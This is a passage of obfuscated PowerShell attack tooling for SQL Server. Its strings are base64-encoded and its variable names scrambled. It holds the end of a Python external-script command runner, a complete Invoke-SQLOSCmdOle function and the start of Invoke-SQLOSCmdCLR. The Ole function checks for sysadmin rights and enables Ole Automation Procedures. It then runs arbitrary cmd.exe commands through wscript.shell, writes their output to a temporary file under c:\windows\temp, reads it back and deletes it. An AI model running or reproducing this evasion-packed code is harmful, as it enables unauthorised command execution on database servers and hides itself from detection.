$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAHMAcABfAGUAeABlAGMAdQB0AGUAXwBlAHgAdABlAHIAbgBhAGwAXwBzAGMAcgBpAHAAdAAgAA0ACgAgACAAIAAgAEAAbABhAG4AZwB1AGEAZwBlACAAPQBOACcAUAB5AHQAaABvAG4AJwAsAA0ACgAgACAAIAAgAEAAcwBjAHIAaQBwAHQAPQBOACcADQAKAGkAbQBwAG8AcgB0ACAAcwB1AGIAcAByAG8AYwBlAHMAcwAgAA0ACgBwACAAPQAgAHMAdQBiAHAAcgBvAGMAZQBzAHMALgBQAG8AcABlAG4AKAAiAGMAbQBkAC4AZQB4AGUAIAAvAGMAIAAkAEMAbwBtAG0AYQBuAGQAIgAsACAAcwB0AGQAbwB1AHQAPQBzAHUAYgBwAHIAbwBjAGUAcwBzAC4AUABJAFAARQApAA0ACgBPAHUAdABwAHUAdABEAGEAdABhAFMAZQB0ACAAPQAgAHAAYQBuAGQAYQBzAC4ARABhAHQAYQBGAHIAYQBtAGUAKABbAHMAdAByACgAcAAuAHMAdABkAG8AdQB0AC4AcgBlAGEAZAAoACkALAAgACIAdQB0AGYALQA4ACIAKQBdACkAJwANAAoAVwBJAFQASAAgAFIARQBTAFUATABUACAAUwBFAFQAUwAgACgAKABbAE8AdQB0AHAAdQB0AF0AIABuAHYAYQByAGMAaABhAHIAKABtAGEAeAApACkAKQA=')))
                if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))){
					${____/=\_/\___/=\/} = Get-SQLQuery -Instance $Instance -Query ${__/\/==\/=\__/==\} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select Output -ExpandProperty Output
				}
				if($Database){
					${____/=\_/\___/=\/} = Get-SQLQuery -Instance $Instance -Query ${__/\/==\/=\__/==\} -Username $Username -Password $Password -Database $Database -Credential $Credential -SuppressVerbose | select Output -ExpandProperty Output
				}
                if($RawResults)
                {
                    ${____/=\_/\___/=\/}                 
                }
                else
                {
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ComputerName, $Instance, [string]${____/=\_/\___/=\/}.trim())                    
                }
                if(${_/===\_/===\/=\/=} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIABlAHgAdABlAHIAbgBhAGwAIABzAGMAcgBpAHAAdABzAA==')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFACAAVwBJAFQASAAgAE8AVgBFAFIAUgBJAEQARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if(${_/\_/\/=\/\/=\/\_} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIABTAGgAbwB3ACAAQQBkAHYAYQBuAGMAZQBkACAATwBwAHQAaQBvAG4AcwA=')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlACAAbwByACAAQwBvAG0AbQBhAG4AZAAgAEYAYQBpAGwAZQBkAA=='))))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\/\/=\__}
    }
}
Function  Invoke-SQLOSCmdOle
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command = "whoami",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )
    Begin
    {
        ${_____/===\_/=====} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZABSAGUAcwB1AGwAdABzAA=='))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                ${_/\_/\/=\/\/=\/\_} = 0
                ${/====\/\____/\_/\} = 0
                ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALgA=')))
                    ${_/=\/\__/\/\__/\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAJwA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    ${_/\/===\/\/\/==\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAG4AbwB0ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAAVABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAByAGUAcQB1AGkAcgBlAHMAIABzAHkAcwBhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzAC4A')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if (${_/\/===\/\/\/==\/} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAZQBuAGEAYgBsAGUAZAAuAA==')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABkAGkAcwBhAGIAbABlAGQALgA=')))
                    ${_/\_/\/=\/\/=\/\_} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${__/\____/\/\_/\/\} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${__/\____/\/\_/\/\} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABmAGEAaQBsAGUAZAAuACAAQQBiAG8AcgB0AGkAbgBnAC4A')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if (${_/=\/\__/\/\__/\/} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATwBsAGUAIABBAHUAdABvAG0AYQB0AGkAbwBuACAAUAByAG8AYwBlAGQAdQByAGUAcwAgAGEAcgBlACAAYQBsAHIAZQBhAGQAeQAgAGUAbgBhAGIAbABlAGQALgA=')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATwBsAGUAIABBAHUAdABvAG0AYQB0AGkAbwBuACAAUAByAG8AYwBlAGQAdQByAGUAcwAgAGEAcgBlACAAZABpAHMAYQBiAGwAZQBkAC4A')))
                    ${/====\/\____/\_/\} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAJwAsADEAOwBSAEUAQwBPAE4ARgBJAEcAVQBSAEUA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${___/=\/\/=\/\_/=\} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAiAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAIgA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${___/=\/\/=\/\_/=\} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMALgA=')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAATwBsAGUAIABBAHUAdABvAG0AYQB0AGkAbwBuACAAUAByAG8AYwBlAGQAdQByAGUAcwAgAGYAYQBpAGwAZQBkAC4AIABBAGIAbwByAHQAaQBuAGcALgA=')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMALgA='))))
                        return
                    }
                }
                ${__/\/=\/==\_/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAZQBtAHAA')))
                $OutputFile = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
                ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwALwA9AFwALwA9AD0AXABfAC8APQBcAF8ALwB9AFwAJABvAHUAdABwAHUAdABmAGkAbABlAC4AdAB4AHQA')))                   
                write-verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AGUAYwB1AHQAaQBuAGcAIABjAG8AbQBtAGEAbgBkADoAIAAkAEMAbwBtAG0AYQBuAGQA')))               
                ${__/\/==\/=\__/==\} = 
$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAEMATABBAFIARQAgAEAAUwBoAGUAbABsACAASQBOAFQADQAKAEQARQBDAEwAQQBSAEUAIABAAE8AdQB0AHAAdQB0ACAAdgBhAHIAYwBoAGEAcgAoADgAMAAwADAAKQANAAoARQBYAEUAQwAgAEAATwB1AHQAcAB1AHQAIAA9ACAAUwBwAF8AbwBhAGMAcgBlAGEAdABlACAAJwB3AHMAYwByAGkAcAB0AC4AcwBoAGUAbABsACcALAAgAEAAUwBoAGUAbABsACAATwB1AHQAcAB1AHQALAAgADUADQAKAEUAWABFAEMAIABTAHAAXwBvAGEAbQBlAHQAaABvAGQAIABAAHMAaABlAGwAbAAsACAAJwByAHUAbgAnACAALAAgAG4AdQBsAGwALAAgACcAYwBtAGQALgBlAHgAZQAgAC8AYwAgACIAJABDAG8AbQBtAGEAbgBkACAAPgAgACQAewBfAC8AXABfAC8APQBcAF8ALwA9AD0APQBcAC8AXAAvAFwAfQAiACcAIAA=')))
                $null = Get-SQLQuery -Instance $Instance -Query ${__/\/==\/=\__/==\} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
                write-verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgBlAGEAZABpAG4AZwAgAGMAbwBtAG0AYQBuAGQAIABvAHUAdABwAHUAdAAgAGYAcgBvAG0AIAAkAHsAXwAvAFwAXwAvAD0AXABfAC8APQA9AD0AXAAvAFwALwBcAH0A')))
                ${___/\_/==\/\__/\_} = 
$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAEMATABBAFIARQAgAEAAZgBzAG8AIABJAE4AVAANAAoARABFAEMATABBAFIARQAgAEAAZgBpAGwAZQAgAEkATgBUAA0ACgBEAEUAQwBMAEEAUgBFACAAQABvACAAaQBuAHQADQAKAEQARQBDAEwAQQBSAEUAIABAAGYAIABpAG4AdAANAAoARABFAEMATABBAFIARQAgAEAAcgBlAHQAIABpAG4AdAAgAA0ACgBEAEUAQwBMAEEAUgBFACAAQABGAGkAbABlAEMAbwBuAHQAZQBuAHQAcwAgAHYAYQByAGMAaABhAHIAKAA4ADAAMAAwACkAIAANAAoARQBYAEUAQwAgAFMAcABfAG8AYQBjAHIAZQBhAHQAZQAgACcAcwBjAHIAaQBwAHQAaQBuAGcALgBmAGkAbABlAHMAeQBzAHQAZQBtAG8AYgBqAGUAYwB0ACcAIAAsACAAQABmAHMAbwAgAE8AdQB0AHAAdQB0ACwAIAA1AA0ACgBFAFgARQBDACAAUwBwAF8AbwBhAG0AZQB0AGgAbwBkACAAQABmAHMAbwAsACAAJwBvAHAAZQBuAHQAZQB4AHQAZgBpAGwAZQAnACAALAAgAEAAZgBpAGwAZQAgAE8AdQB0ACwAIAAnACQAewBfAC8AXABfAC8APQBcAF8ALwA9AD0APQBcAC8AXAAvAFwAfQAnACwAMQANAAoARQBYAEUAQwAgAHMAcABfAG8AYQBjAHIAZQBhAHQAZQAgACcAcwBjAHIAaQBwAHQAaQBuAGcALgBmAGkAbABlAHMAeQBzAHQAZQBtAG8AYgBqAGUAYwB0ACcALAAgAEAAbwAgAG8AdQB0ACAADQAKAEUAWABFAEMAIABzAHAAXwBvAGEAbQBlAHQAaABvAGQAIABAAG8ALAAgACcAbwBwAGUAbgB0AGUAeAB0AGYAaQBsAGUAJwAsACAAQABmACAAbwB1AHQALAAgACcAJAB7AF8ALwBcAF8ALwA9AFwAXwAvAD0APQA9AFwALwBcAC8AXAB9ACcALAAgADEAIAANAAoARQBYAEUAQwAgAEAAcgBlAHQAIAA9ACAAcwBwAF8AbwBhAG0AZQB0AGgAbwBkACAAQABmACwAIAAnAHIAZQBhAGQAYQBsAGwAJwAsACAAQABGAGkAbABlAEMAbwBuAHQAZQBuAHQAcwAgAG8AdQB0ACAADQAKAFMARQBMAEUAQwBUACAAQABGAGkAbABlAEMAbwBuAHQAZQBuAHQAcwAgAGEAcwAgAG8AdQB0AHAAdQB0AA==')))               
                ${____/=\_/\___/=\/} = Get-SQLQuery -Instance $Instance -Query ${___/\_/==\/\__/\_} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property output -ExpandProperty output
                write-verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgBlAG0AbwB2AGkAbgBnACAAZgBpAGwAZQAgACQAewBfAC8AXABfAC8APQBcAF8ALwA9AD0APQBcAC8AXAAvAFwAfQA=')))
                ${/==\__/=\__/=\/==} = 
$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAEMATABBAFIARQAgAEAAUwBoAGUAbABsACAASQBOAFQADQAKAEUAWABFAEMAIABTAHAAXwBvAGEAYwByAGUAYQB0AGUAIAAnAHcAcwBjAHIAaQBwAHQALgBzAGgAZQBsAGwAJwAgACwAIABAAHMAaABlAGwAbAAgAE8AdQB0AHAAdQB0ACwAIAA1AA0ACgBFAFgARQBDACAAUwBwAF8AbwBhAG0AZQB0AGgAbwBkACAAQABTAGgAZQBsAGwALAAgACcAcgB1AG4AJwAgACwAIABuAHUAbABsACwAIAAnAGMAbQBkAC4AZQB4AGUAIAAvAGMAIAAiAGQAZQBsACAAJAB7AF8ALwBcAF8ALwA9AFwAXwAvAD0APQA9AFwALwBcAC8AXAB9ACIAJwAgACwAIAAnADAAJwAgACwAIAAnAHQAcgB1AGUAJwA=')))
                $null = Get-SQLQuery -Instance $Instance -Query ${/==\__/=\__/=\/==} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property output -ExpandProperty output
                if($RawResults)
                {
                    ${____/=\_/\___/=\/} | Select output -ExpandProperty output
                }
                else
                {
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ComputerName, $Instance, [string]${____/=\_/\___/=\/}.trim())
                }
                if(${/====\/\____/\_/\} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMA')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAJwAsADAAOwBSAEUAQwBPAE4ARgBJAEcAVQBSAEUA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if(${_/\_/\/=\/\/=\/\_} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIABTAGgAbwB3ACAAQQBkAHYAYQBuAGMAZQBkACAATwBwAHQAaQBvAG4AcwA=')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlACAAbwByACAAQwBvAG0AbQBhAG4AZAAgAEYAYQBpAGwAZQBkAA=='))))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\/\/=\__}
    }
}
Function  Invoke-SQLOSCmdCLR
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )
